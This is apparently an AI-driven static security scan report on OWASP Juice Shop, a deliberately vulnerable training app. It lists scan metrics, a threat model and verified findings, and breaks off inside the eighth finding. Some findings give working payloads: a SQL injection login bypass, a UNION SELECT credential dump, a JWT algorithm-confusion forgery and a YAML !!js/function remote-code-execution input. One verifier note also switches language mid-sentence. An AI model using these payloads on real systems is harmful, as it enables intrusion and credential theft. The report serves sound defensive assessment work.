# Agentic SAST — juice-shop

## Summary


## Scan Metrics

- Scan ID: 2026-06-16T08:57:33Z__juice-shop
- Module: juice-shop
- Start: 2026-06-16T08:57:33Z
- End: 2026-06-18T06:38:58Z
- Duration (sec): 164485
- Files in scope: 607
- Files analyzed (unique): 524
- Coverage: 86.3%
- Chunks: 490 (risk=6, catch-all=114, specialist=370)
- Tokens (prompt): 40092851
- Tokens (completion): 2518248
- Tokens (total): 42611099

- Folders scanned: 105
### Tokens by Phase

_Prompt = fresh + cache-write (billable). Cache-read shown separately, NOT included in totals._

| Phase | Calls | Prompt | Completion | Total | % | Cache-read (excl.) |
|---|---:|---:|---:|---:|---:|---:|
| s6-verify | 2150 | 33,253,323 | 2,213,817 | 35,467,140 | 83.2 | 0 |
| s4-deepdive | 490 | 6,197,243 | 251,695 | 6,448,938 | 15.1 | 0 |
| s1-preprocess | 11 | 547,600 | 7,300 | 554,900 | 1.3 | 0 |
| s5-prefilter | 1 | 69,441 | 20,744 | 90,185 | 0.2 | 0 |
| s7-dedup | 1 | 8,411 | 7,274 | 15,685 | 0.0 | 0 |
| s3-decompose | 1 | 8,874 | 6,497 | 15,371 | 0.0 | 0 |
| s1-autoexclude | 1 | 4,091 | 4,688 | 8,779 | 0.0 | 0 |
| s2-threatmodel | 1 | 3,307 | 5,437 | 8,744 | 0.0 | 0 |
| unlabeled | 2 | 561 | 796 | 1,357 | 0.0 | 0 |

### Language LOC Coverage

| Language | LOC in scope | LOC scanned | Coverage % |
|---|---:|---:|---:|
| javascript | 21424 | 21424 | 100.0 |
| other | 13622 | 8922 | 65.5 |
| solidity | 552 | 552 | 100.0 |
| typescript | 23846 | 23846 | 100.0 |
| web-template | 4972 | 4972 | 100.0 |

## Scan Health

- ⚠️ Degraded coverage: 1/490 deep-dive chunk(s) failed or timed out — their findings are absent from this report.
- Recoverable errors logged by stage: s4=19, s6-verify=81
- Full error log: `juice-shop_20260616T085733Z_errors.jsonl`

## Threat Model

### System context

OWASP Juice Shop is a deliberately insecure e-commerce web application designed for web security training, education, and penetration testing. Built with TypeScript (Node.js/Express backend) and Angular frontend, it simulates a modern online store selling goods, services, and digital content. It runs as a containerized application deployed via Docker, exposing port 3000 for HTTP/HTTPS traffic. Its primary consumers are security professionals, students, and automated pentest tools interacting programmatically via its Swagger-defined REST API or through the rendered web UI.

### Assets

| Asset | Sensitivity | Description |
|---|---|---|
| Application Logic & Challenge Flags | critical | Deliberately flawed business logic, CTF flags, and training scenarios that form the educational core of the application. |
| Customer & E-Commerce Data | high | Synthetic but realistic PII, order histories, product catalogs, payment tokens, and user reviews used for simulation. |
| Configuration & Runtime Secrets | high | JWT signing secrets, database credentials, API keys, and application settings loaded at startup or via environment variables. |
| Backend Runtime & Filesystem | high | Node.js container privileges, local file system access, FTP/artifact storage, and execution environment used to process data and serve assets. |

### Trust boundaries

- **REST API (Swagger/Express routes)** — unauth internet → Express middleware → API handlers → Application Logic & Challenge Flags, Customer & E-Commerce Data, Configuration & Runtime Secrets
- **Web UI (Angular SPA + SSR)** — unauth internet → static asset server → Angular router → API fetch → Application Logic & Challenge Flags, Customer & E-Commerce Data
- **Container Runtime & Env Vars** — host/distroless → environment/config loader → app initialization → Configuration & Runtime Secrets, Backend Runtime & Filesystem
- **Package Manager & Build Artifacts** — npm registry / Docker layer → runtime node_modules → execution → Backend Runtime & Filesystem

### Ranked threats

| ID | Threat | Actor | Surface | Asset | Impact | Likelihood | Controls |
|---|---|---|---|---|---|---|---|
| T1 | Remote actor bypasses authentication to access admin functions or customer profiles via flawed JWT validation or weak session handling. | remote_unauth | REST API (Swagger/Express routes) | Application Logic & Challenge Flags | critical | almost_certain | none |
| T2 | Remote actor modifies API parameters to read or alter orders and profile data belonging to other users (IDOR). | remote_unauth | REST API (Swagger/Express routes) | Customer & E-Commerce Data | high | likely | none |
| T3 | Remote actor extracts sensitive configuration or source paths via verbose error messages and exposed stack traces. | remote_unauth | REST API (Swagger/Express routes) | Configuration & Runtime Secrets | high | likely | none |
| T4 | Remote actor induces DoS by triggering resource-intensive image processing or unbounded database queries. | remote_unauth | REST API (Swagger/Express routes) | Backend Runtime & Filesystem | high | possible | none |
| T5 | Remote actor executes arbitrary JavaScript in user browsers via stored/reflected input or Angular sanitizer bypass in UI inputs. | remote_unauth | Web UI (Angular SPA + SSR) | Customer & E-Commerce Data | high | likely | none |
| T6 | Remote actor crafts malicious requests to force authenticated users to perform unintended state-changing actions like address updates or purchases. | remote_unauth | Web UI (Angular SPA + SSR) | Customer & E-Commerce Data | medium | likely | none |
| T7 | Remote actor bypasses intended checkout or authentication flows by manipulating frontend state or URLs without backend enforcement. | remote_unauth | Web UI (Angular SPA + SSR) | Application Logic & Challenge Flags | medium | likely | none |
| T8 | Supply chain actor injects malicious code into node_modules or Docker build layers to compromise the backend runtime execution path. | supply_chain | Package Manager & Build Artifacts | Backend Runtime & Filesystem | existential | rare | none |

### Open questions

- Does the production deployment enforce a WAF, rate limiting, or strict CORS policies to mitigate API abuse?
- Are JWT secrets and database credentials rotated per instance or hard-coded/static for training purposes?
- What is the exact database backend (SQLite, MongoDB, PostgreSQL) and its isolation model across tenants?
- Does the Docker build process pin base image digests and verify npm integrity (npm package-lock.json / shrinkwrap) to prevent layer/package substitution?
- Are Angular JIT compilation or server-side template rendering risks mitigated against malicious template injection?

## Verification
- Raw findings (pre-verification): 321
- True positives (verified): 32
- False positives (dropped): 115
- Verifier errors (excluded — undetermined, not confirmed clean): 81
- Duplicates collapsed (all passes): 83
- Verification precision: 10.0%

## Findings (32)

### 1. [CRITICAL] JWT Algorithm Confusion and Missing Expiration Validation
**Class:** CWE-345: Insufficient Verification of Data Authenticity
**CWE:** CWE-345: Insufficient Verification of Data Authenticity - https://cwe.mitre.org/data/definitions/345.html
**File:** `lib/insecurity.ts:50-52`
**CVSS 3.1:** **10.0** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)
**Also at:** `lib/insecurity.ts:159-162`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Tokens are signed with `algorithm: 'RS256'` on line 50, but verification on line 51 uses `jws.verify(token, publicKey)`. The `jws` library ignores the `alg` header and will treat the provided `publicKey` as a symmetric HMAC secret if the token specifies `alg: HS256`. Furthermore, `jws.verify` does not check the `exp` claim set by `authorize`, meaning expired tokens remain valid forever. This combination allows complete cryptographic bypass of the authentication and 2FA flows.

#### Impact
Forged JWTs using the public key as an HMAC secret bypass cryptographic verification and 2FA controls, granting full account takeover with indefinitely replayable sessions.

#### Exploit scenario
Forge a JWT with `alg: HS256`, payload `{ userId: 1, type: 'password_valid_needs_second_factor_token' }`, and sign it using the known `publicKey`. Submit this token to `/login/2fa`. The application validates the signature, skips expiration checks, accepts the forged user context, and grants full authenticated session access.

#### Preconditions
- Attacker can obtain the `publicKey` (exported in `lib/insecurity.ts:16`), and has network access to authentication endpoints.

```
export const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })
export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false
```

#### How to fix
Enforce allowed algorithms explicitly during verification (e.g., `algorithms: ['RS256']`). Replace `jws` with a higher-level JWT library that validates `exp` and enforces algorithm constraints by default, or manually verify `exp` before processing the token.

**Exploitability:** CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N). Pre-auth auth bypass; missing exp check + algo confusion allows trivial JWT forgery and session hijacking.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — (no reason given)

Now I have a thorough understanding. Let me summarize my findings:

**Key facts established:**

1. **`jws.verify` does indeed support algorithm confusion**: The `jws` library reads the `alg` header from the JWT and uses the second parameter as an HMAC key if `alg` is HS256/384/512, or as an RSA public key if `alg` is RS256. If a token is forged with `alg: HS256` and signed with a known secret, `jws.verify(token, publicKey)` will treat `publicKey` as an HMAC secret and verify successfully.

2. **The public key is publicly accessible**: Route `/encryptionkeys/jwt.pub` at `server.ts:257` serves the public key file without any authentication. An unauthenticated attacker can retrieve it.

3. **`jws.verify` does NOT check `exp`**: Unlike `jsonwebtoken.verify`, the `jws` library does not validate expiration or other payload claims. It only validates the signature.

4. **Attack paths exist in production**:
   - `isAccounting()` middleware (lines 148–157) is used on `GET /rest/order-history/orders` and `PUT /rest/order-history/:id/delivery-status` (server.ts:577-578) with no other access control in front.
   - `isDeluxe()` and `isCustomer()` are used in routes that check roles from the decoded JWT payload.
   - All three call `verify(jwtFrom(req)) && decode(jwtFrom(req))` which uses `jws` entirely.
   - `/rest/2fa/verify` (server.ts:422) has NO middleware gate (no `isAuthorized()`), and uses `verify && decode` for the tmpToken — though this still requires a valid TOTP code for full exploitation.

5. **No defende exists in the code**: There is no algorithm enforcement (e.g., `algorithms: ['RS256']`), no `exp` check, and no allow-list. The `publicKey` is served on a public route.

6. **This is juice-shop** — a well-known deliberately vulnerable learning application. That doesn't negate the exploitability of the code as written.

### 2. [CRITICAL] Unparameterized email field enables SQL injection authentication bypass
**Class:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
**CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) - https://cwe.mitre.org/data/definitions/89.html
**File:** `routes/login.ts:30-30`
**CVSS 3.1:** **10.0** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 1.00 (1 run agreed)

#### Description
The login handler constructs a raw SQL query using JavaScript template literals, directly interpolating the untrusted `req.body.email` value into the WHERE clause (`routes/login.ts:30`). Because the input is concatenated as raw SQL text without sanitization, escaping, or ORM parameterization, an attacker can break out of the email string literal and inject arbitrary SQL logic. The database evaluates the injected condition before checking the hashed password, effectively neutralizing the password verification step. When `sequelize.query` executes this malformed statement, it returns the first matching row from the Users table, which the handler treats as a successful login and proceeds to generate a full session token.

#### Impact
An anonymous attacker can bypass authentication by injecting SQL syntax into the email parameter, gaining unauthorized access to any account session without valid credentials. This compromises confidentiality and integrity, potentially exposing sensitive PII or granting administrative control.

#### Exploit scenario
Attacker sends a POST to /api/1/user/login with body: { "email": "' OR '1'='1' --", "password": "[REDACTED-SECRET]" }. The backend constructs: "SELECT * FROM Users WHERE email = '' OR '1'='1' --' AND password = '...' AND deletedAt IS NULL". The database resolves to TRUE for the first row, returns that user object, and the application returns a valid authentication token, logging the attacker in as that user.

#### Preconditions
- Attacker has anonymous network access to the application
- Victim endpoint accepts POST /api/1/user/login

```
    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```

#### How to fix
Eliminate string interpolation for SQL data. Replace the raw query with a parameterized ORM call (e.g., `UserModel.findOne({ where: [ Sequelize.literal('email = ? AND deletedAt IS NULL'), req.body.email ] })`) or `sequelize.query('SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL', [req.body.email, security.hash(req.body.password)])` to enforce strict data-only evaluation.

**Exploitability:** CVSS 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N). Pre-auth SQLi in login neutralizes password hashing; direct database row return yields full account takeover.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — SQL injection in login handler is present and exploitable exactly as described; Juice Shop is an intentionally vulnerable CTF/training application where such findings are both real and by design.

Looking at the key code on line 31:

```typescript
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```

I can confirm:
1. **Unparameterized raw SQL**: `req.body.email` is directly interpolated into the query string via template literal
2. **No sanitization**: Zero input validation is applied to `req.body.email` before interpolation
3. **Authentication bypass path**: When `req.body.email` is `' OR '1'='1` the WHERE clause becomes `email = '' OR '1'='1'` which always matches the first row. The `password` check is commented out by the injected `--` if included, or evaluated but the email condition is already TRUE
4. **Session creation**: If a user row is returned (line 32–52), `afterLogin()` (line 20) calls `security.authorize(user)` which creates a JWT token, and the token is stored in `security.authenticatedUsers.put(token, user)` (line 22)

This is **OWASP Juice Shop** (`package.json`: `"name": "juice-shop"`, `"keywords": ["owasp", "pentest", "ctf", "vulnerable", "awareness"]`). It is an intentionally vulnerable web application designed for security training. The vulnerability is intentional.

However, from a SAST scanning perspective, the finding IS **technically correct** — the SQL injection exists exactly as described and is exploitable. Juice Shop is designed to be attacked, so the vulnerability is real and actionable.

### 3. [CRITICAL] Arbitrary code execution via YAML constructor deserialization
**Class:** CWE-502: Deserialization of Untrusted Data
**CWE:** CWE-502: Deserialization of Untrusted Data - https://cwe.mitre.org/data/definitions/502.html
**File:** `routes/fileUpload.ts:110-114`
**CVSS 3.1:** **9.8** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The handleYamlUpload middleware converts the uploaded file's buffer to a string (line 110) and passes it directly to yaml.load() inside a vm.runInContext() call (line 114). The js-yaml library supports constructor deserialization tags (e.g., !!js/function). Because the VM context is not isolated from the Node.js standard library or global object, executing the deserialized function grants full server-side code execution.

#### Impact
Grants remote code execution (RCE) on the server. The attacker can execute arbitrary JavaScript, read/modify files, or pivot to the underlying host.

#### Exploit scenario
Upload a .yaml file containing data: !!js/function > - "return process.mainModule.require('child_process').execSync('id')". The library deserializes this into a function, which vm.runInContext executes, sending a system command to the server.

#### Preconditions
- Attacker must have file upload capability (unauthenticated or standard user role)

```
const data = file.buffer.toString()
try {
  const sandbox = { yaml, data }
  vm.createContext(sandbox)
  const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```

#### How to fix
Use yaml.safeLoad() or enforce a strict schema that disallows constructor tags, and isolate vm contexts from the global object if dynamic execution is unavoidable.

**Exploitability:** CVSS 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Unrestricted YAML deserialization in file upload yields pre-auth RCE; VM context not sandboxed from Node globals.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Genuine RCE via unsafe YAML deserialization reachable from unauthenticated user; challenge gating is a deliberate game mechanic, not a security defense

Analysis complete across the full call chain. Here's the definitive verdict:

The code at `routes/fileUpload.ts:114` does indeed call `yaml.load(data)` on attacker-controlled input (the uploaded YAML file buffer). The `js-yaml` `load()` function supports constructor deserialization tags (`!!js/function`, `!!js/regexp`, etc.) that execute arbitrary JavaScript. The `vm.runInContext()` wrapper is a red herring—the actual vulnerability is `yaml.load()` itself, not the VM context escaping.

**Why the scanner might appear wrong or might be right:**

1. **Challenge gating**: Line 109 gates the code behind `utils.isChallengeEnabled(challenges.deprecatedInterfaceChallenge)`. This challenge has **no** `disabledEnv` entries in `data/static/challenges.yml`, so it's **enabled by default** (even with `safetyMode: auto`). The defense mechanism is a deliberate game mechanic, not a security control.

2. **No auth gate**: The `/file-upload` POST endpoint has no authorization middleware. Unauthenticated users can trigger code execution.

3. **This is OWASP Juice Shop** — a deliberately vulnerable CTF application. The vulnerability is the entire point. The scanner correctly identified genuine exploitable code.

This is a **TRUE_POSITIVE**.

### 4. [CRITICAL] Unauthenticated SQL Injection in product search
**Class:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
**CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) - https://cwe.mitre.org/data/definitions/89.html
**File:** `routes/search.ts:17-19`
**CVSS 3.1:** **9.1** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 1.00 (1 run agreed)

#### Description
The untrusted HTTP query parameter 'q' is read directly from req.query (line 17) and subjected only to a trivial 200-character length truncation. It is then directly interpolated into a raw SQL string passed to models.sequelize.query (line 19). Because the raw query method is invoked without parameter binding, the input is executed verbatim by the SQLite engine, completely bypassing the ORM's built-in sanitization guards. The length limit does not neutralize the injection class; UNION SELECT payloads easily fit within 200 bytes.

#### Impact
Allows full database enumeration and credential theft by bypassing ORM escaping. Attacker can extract all user passwords and schema via the public search endpoint.

#### Exploit scenario
Attacker sends GET /api/Products/search?q=1%20UNION%20SELECT%201,username,password,4,5,6,7,8%20FROM%20Users, returning raw credential tuples embedded in the product search JSON response.

#### Preconditions
- Anonymous access to the /api/Products/search endpoint

```
    criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
    criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

#### How to fix
Replace the raw string interpolation with Sequelize's parameterized query interface (e.g., Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })) to ensure all external input is safely escaped prior to execution.

**Exploitability:** CVSS 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N). Pre-auth SQLi in product search; raw `sequelize.query` with unparameterized input allows full DB read/write/stack overflow.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — Confirmed exact sink at lines 17-19 of routes/search.ts; `req.query.q` is interpolated verbatim into a raw sequelize.query() string with no parameterized binding. The endpoint /rest/products/search is registered on line 555 of server.ts with no authentication middleware (unlike /rest/user/* which has security.updateAuthenticatedUsers()). The test suite in test/api/searchApiSpec.ts contains explicit UNION SELECT payloads, proving the path works. The length truncation is irrelevant to UNION injection. This is a classic raw SQL injection in an intentionally vulnerable training app (OWASP Juice Shop), but the finding itself is technically accurate.



### 5. [CRITICAL] IDOR Allows Arbitrary Coupon Application on Any Basket
**Class:** CWE-264
**CWE:** CWE-264 - https://cwe.mitre.org/data/definitions/264.html
**File:** `routes/coupon.ts:8-21`
**CVSS 3.1:** **9.6** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The `applyCoupon` endpoint extracts the basket identifier directly from the request URL parameters (`params.id` at line 10) and updates the corresponding record via `BasketModel.findByPk(id)` (line 15) without verifying that the authenticated user owns the basket. The frontend `request.interceptor.ts` automatically injects the user's session token into the `Authorization` header, but the backend route handler ignores any session context for authorization checks. Consequently, the resource ownership is entirely client-supplied.

#### Impact
An attacker can apply coupon discounts to any user's shopping basket without owning the basket or obtaining authorization. This bypasses financial controls and may enable free purchases, price manipulation, or automated enumeration of active basket IDs.

#### Exploit scenario
An attacker obtains a valid basket ID (from URL history or enumeration) and sends a request to the coupon endpoint: `GET /api/Coupon/applyCoupon/{victim_basket_id}?coupon=SALE20`. The server applies the discount to the victim's basket. If the basket proceeds to checkout, the attacker's session can utilize this modified basket state if the application binds subsequent requests to the session rather than the basket owner.

#### Preconditions
- Attacker has a valid authenticated session
- Attacker knows or can guess a victim's active basket ID

```
      const id = params.id
      let coupon: string | undefined | null = params.coupon ? decodeURIComponent(params.coupon) : undefined

      const basket = await BasketModel.findByPk(id)
```

#### How to fix
Derive the basket context strictly from the authenticated session payload or verify ownership by filtering: `BasketModel.findOne({ where: { id: id, UserId: session.userId } })`.

**Exploitability:** CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N). Authenticated IDOR with high blast radius; arbitrary coupon application breaks pricing guarantees and revenue controls.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Unconditionally exploitable IDOR allows authenticated users to read, modify, and checkout any other user's basket without ownership verification.

The finding is **TRUE_POSITIVE**.

**Analysis**

1.  **Code Verification**:
    *   **`routes/coupon.ts` (Line 15)**: The code unconditionally fetches a basket using the user-supplied `params.id`:
        ```typescript
        const basket = await BasketModel.findByPk(id)
        ```
        There is no check verifying that `basket.UserId` (or equivalent ownership field) matches the authenticated user's ID.
    *   **`server.ts` (Line 322 & 558)**: The route `PUT /rest/basket/:id/coupon/:coupon` is exposed to **any authenticated user**. It is gated by `security.isAuthorized()` (which validates the JWT token) but explicitly **lacks** any middleware that enforces object-level authorization (ownership checks).

2.  **Call Chain & Impact**:
    *   An authenticated attacker can trivially enumerate basket IDs (which are sequential integers in this implementation) and modify another user's basket.
    *   **Confidentiality Impact**: The related `GET /rest/basket/:id` endpoint (`routes/basket.ts`, line 16) *also* lacks ownership checks. An attacker can read any user's active shopping cart contents.
    *   **Integrity Impact**: Even worse, `POST /rest/basket/:id/checkout` (`routes/order.ts`, line 33) similarly lacks ownership verification. An attacker can checkout a victim's basket using the *attacker's* account credentials, effectively stealing the victim's items.

3.  **Defence Verification**:
    *   There are no input validation allow-lists, framework-level binding, or feature flags that mitigate this. The only "authorization" present validates that the caller has *some* session token, not that they are the *owner* of the requested resource.
    *   The comment `challengeUtils.solveIf` in `routes/basket.ts` is merely a CTF telemetry tracker and does not block the request.

**VERDICT & CVSS**

### 6. [CRITICAL] Hardcoded Symmetric Cryptographic Key
**Class:** CWE-321
**CWE:** CWE-321 - https://cwe.mitre.org/data/definitions/321.html
**File:** `lib/insecurity.ts:38-38`
**CVSS 3.1:** **9.1** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The hmac function hardcodes the symmetric key pa4qacea4VK9t9nGv7yZtwmj directly into the application bundle. Unlike keys stored in environment variables, secret managers, or KMS, this secret is permanently exposed to anyone who can read the source code or inspect deployed container layers. This breaks the fundamental crypto requirement that keys remain confidential.

#### Impact
The plaintext HMAC secret is embedded in the source code. If used for any security-sensitive operations, it allows any attacker with repository access to forge valid tokens or bypass integrity checks.

#### Exploit scenario
An attacker clones the repository or inspects the running container, extracts pa4qacea4VK9t9nGv7yZtwmj, and uses it to generate valid HMAC signatures for any endpoint relying on the hmac() function (e.g., generating discount coupons or validating API requests), bypassing server-side verification.

#### Preconditions
- Attacker must be able to read the application source code or container filesystem
- The hardcoded key must be actively used for a security boundary

```
export const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')
```

#### How to fix
Rotate the exposed key immediately. Move all cryptographic keys to runtime injection via secure environment variables. In lib/insecurity.ts:38, replace the literal string with process.env.HMAC_SECRET_KEY and add a startup safeguard to reject deployment if the variable is missing.

**Exploitability:** CVSS 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Pre-auth fundamental crypto breakdown; hardcoded HMAC/secret key nullifies all JWT integrity and 2FA cryptographic guarantees.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — The scanner accurately identified a statically embedded HMAC secret used to verify security answers for password resets. The key is permanently exposed in the application bundle, allowing anyone with source/asset access to forge valid verification digests and bypass server-side authentication logic.

**Verification Analysis**

**1. Code Confirmation**
I read `lib/insecurity.ts` directly. Line 38 contains exactly:
`export const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')`
The scanner's snippet is a precise match. The function unconditionally injects the string literal `pa4qacea4VK9t9nGv7yZtwmj` as the symmetric key for the HMAC-SHA256 construction.

**2. Call Chain & Security Boundary**
Traced imports outward. The function is re-exported and consumed by dozens of routes/models. Its most critical security-adjacent usage is in `routes/resetPassword.ts:38` (compiled to `build/routes/resetPassword.js:61`):
`if ((data != null) && security.hmac(answer) === data.answer) {`
Here, `hmac()` verifies a user-supplied security answer against a database-stored digest. 

**3. Defense & Impact Assessment**
- **No mitigating controls:** There are no fallback environment variables, secret manager lookups, or conditional compilation steps that replace the literal at runtime. 
- **Impact:** Because this is a symmetric key, any entity that can read the source code, inspect the bundled JS artifact, or pull the container layer can extract `pa4qacea4VK9t9nGv7yZtwmj`. With the key, an attacker can locally compute valid HMAC digests for any arbitrary security answer, bypassing server-side verification and resetting any account's password.
- **Scope:** The vulnerability is not localized to a test harness or internal tooling; it is a core cryptographic utility in the application bundle.

**4. Verdict Justification**
The scanner correctly identified the sink (`crypto.createHmac`), the attack vector (hardcoded secret), and the real impact (forgeable MACs bypassing an auth-adjacent control). There is no misreading of the code, and the cryptographic requirement "keys must remain confidential" is demonstrably violated.

### 7. [CRITICAL] Unverified author field allows identity forgery
**Class:** CWE-345: Insufficient Verification of Data Authenticity
**CWE:** CWE-345: Insufficient Verification of Data Authenticity - https://cwe.mitre.org/data/definitions/345.html
**File:** `routes/createProductReviews.ts:13-26`
**CVSS 3.1:** **9.3** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The handler extracts the authenticated user context via `security.authenticatedUsers.from(req)` (line 13) but never enforces that the submitted review belongs to that user. Lines 14-17 only use `user?.data?.email !== req.body.author` to trigger a training challenge hook; they do not restrict execution. Lines 20-26 blindly forward `req.body.author` to MongoDB without cryptographic signing, HMAC, or server-side authorization checks. Because the trust boundary relies entirely on the client-provided payload, the route accepts attacker-controlled identity data and stores it as truth.

#### Impact
An attacker can inject an arbitrary email address into the `author` field of a review, impersonating the actual reviewer or any third party. This breaks audit integrity, enables false attribution, and completely bypasses server-side identity binding.

#### Exploit scenario
The attacker sends a POST to the review endpoint with `author: "legitimate_user@company.com"`. The server stores and publishes the review listing the victim as the author, requiring no valid session, cryptographic key, or additional privileges.

#### Preconditions
- Network access to the application HTTP endpoint
- Ability to construct arbitrary HTTP request parameters

```
    const user = security.authenticatedUsers.from(req)
    challengeUtils.solveIf(
      challenges.forgedReviewChallenge,
      () => user?.data?.email !== req.body.author
    )

    try {
      await reviewsCollection.insert({
        product: req.params.id,
        message: req.body.message,
        author: req.body.author,
        likesCount: 0,
        likedBy: []
      })
      return res.status(201).json({ status: 'success' })
    }
```

#### How to fix
Strip `req.body.author` entirely and derive identity server-side: `author: user.email` (with a strict `if (!user) return 401`). If cross-service identity transmission is required, transmit an integrity-protected token (e.g., HMAC-SHA256 or JWS) that the server verifies before deserializing the author field.

**Exploitability:** CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N). Pre-auth review forgery; arbitrary author field injection undermines trust in UGC and product reputations.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Unauthenticated PUT route accepts arbitrary author field; no auth, validation, or authorization defenses present on this specific route.

Now I have the complete picture. The critical evidence is on **server.ts line 588**:

```typescript
app.put('/rest/products/:id/reviews', createProductReviews())
```

Compare to line 589 (the *update* route):

```typescript
app.patch('/rest/products/reviews', security.isAuthorized(), updateProductReviews())
```

The PUT (create) review route has **zero middleware** — no `security.isAuthorized()`, no `appendUserId()`, nothing. The `security.isAuthorized()` function (defined in `lib/insecurity.ts` line 48) wraps `express-jwt` to enforce authenticated request tokens. Without it, any unauthenticated HTTP client can reach this handler.

Within the handler itself (`routes/createProductReviews.ts`), lines 20-26 unconditionally write `req.body.author` into MongoDB:

```typescript
await reviewsCollection.insert({
  product: req.params.id,
  message: req.body.message,
  author: req.body.author,       // ← attacker-controlled, no sanitization
  likesCount: 0,
  likedBy: []
})
```

The code even checks for the challenge condition (`challengeUtils.solveIf`) when `user?.data?.email !== req.body.author` — which only *triggers* when the author *is* forged, confirming this is the intended exploit path.

**Defense analysis:**
- **No auth gate on this route:** Confirmed absent. Every other write route (`/rest/products/reviews` PATCH for updates, POST for likes) explicitly has `security.isAuthorized()`.
- **No output validation:** The stored value isn't re-checked at read time. The reviews are displayed verbatim.
- **No allow-list / domain validation on `author`:** Any string is accepted.

**Verdict:** The scanner is correct. An unauthenticated attacker can POST/PUT to `/rest/products/:id/reviews` with `author: "legitimate_person@domain.com"` and the review will be stored and displayed as that person, with no authentication, authorization, or integrity verification.

CONFIDENCE: 8/10. This is clearly the Juice Shop deliberately vulnerable CTF application (evidenced by `challenges.forgedReviewChallenge` and `lib/insecurity.ts`), so the "vulnerability" is intentionally planted.但从技术审查角度看，该漏洞确实存在且可被任何网络接入者利用。The impact is real: review impersonation and trust abuse.

### 8. [CRITICAL] Trivial Path Traversal in ZIP Extraction
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/fileUpload.ts:39-42`
**CVSS 3.1:** **9.3** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
